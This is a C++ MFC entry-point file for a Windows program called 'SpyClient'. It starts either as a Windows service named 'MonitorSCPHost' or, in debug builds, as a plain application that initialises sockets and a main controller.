// SpyClient.cpp : 定义控制台应用程序的入口点。
//
#include "stdafx.h"
#include <windows.h>
#include <winsvc.h>
#include "SpyClient.h"
#include "ServiceCtrl.h"
#include "MainCtrl.h"
#include "AppConfig.h"
#include "LogMod.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CWinApp theApp;

using namespace std;


int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;
	
	//Releaseinfo("_tmain");
	//从服务启动
	//sc <server> create [服务名] [binPath= ] <option1> <option2>...
#ifndef _DEBUG
	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
	{
		//CLogMod::SharedInstance()->LogError("错误: MFC 初始化失败\n");
		cout<<"错误: MFC 初始化失败"<<endl;
		nRetCode = 1;
	}
	else
	{
		cout<<"service begin"<<endl;
		Releaseinfo("service begin");
		//CLogMod::SharedInstance()->LogError("service begin!");
		//if(AppConfig::SharedInstance()->GetUserID() == "" || CBase::Instance()->InstallPath == "\\")
		//{
		//	CLogMod::SharedInstance()->WriteLog("userid is not exist or can not find InstallPath.\n");
		//	return nRetCode;
		//}
		if (!AfxSocketInit())
		{
			Releaseinfo("AfxSocketInit");
			return -1;
		}
		SERVICE_TABLE_ENTRY ServiceTable[2];
		ServiceTable[0].lpServiceName = _T("MonitorSCPHost");
		ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)CmdStart;
	    ServiceTable[1].lpServiceName = NULL;
		ServiceTable[1].lpServiceProc = NULL;
		StartServiceCtrlDispatcher(ServiceTable); 
		Releaseinfo("service end");
	}

	return nRetCode;

#else
	// run as win32 application not service  author: Zelong Yin
	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))  //to initialize MFC,Retrieves the command-line string for the current process
	{
		// TODO: 更改错误代码以符合您的需要
		_tprintf(_T("错误: MFC 初始化失败\n"));
		nRetCode = 1;
	}
	else
	{
		if (!AfxSocketInit())      //to initialize Windows Sockets
		{
			return -1;
		}

		CMainCtrl::SharedInstance()->Init(); //Debug形式下初始化对CMainCtrl进行初始化  
	}
	return nRetCode;
#endif
}
